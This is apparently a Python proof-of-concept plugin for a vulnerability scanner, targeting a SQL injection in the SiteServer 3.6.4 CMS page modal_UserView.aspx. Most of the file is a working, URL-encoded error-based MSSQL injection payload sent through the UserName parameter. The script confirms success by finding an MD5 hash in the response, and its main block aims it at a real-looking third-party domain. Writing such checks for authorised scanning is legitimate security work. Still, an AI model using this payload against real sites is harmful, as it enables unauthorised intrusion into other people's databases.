#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = SiteServer 3.6.4cms系统modal_UserView.aspx页面 sql注入漏洞
import re

def assign(service, arg):
    if service == "siteserver":
        return True, arg

def audit(arg):
    payload = 'siteserver/userRole/modal_UserView.aspx?UserName=d%27%2b%28SELECT%20%27QfBI%27%20WHERE%205013%3D5013%20AND%207630%3DCONVERT%28INT%2C%28SELECT%20CHAR%2833%29%2b%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28sys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%27123%27%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2bCHAR%2833%29%29%29%29%2b%27'
    target = arg + payload
    code, head,res, errcode, _   = curl.curl2(target)
    if code!=0 and '202cb962ac59075b964b07152d234b70' in res:
        security_hole(target)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('siteserver', 'http://www.enantiotech.com/')[1])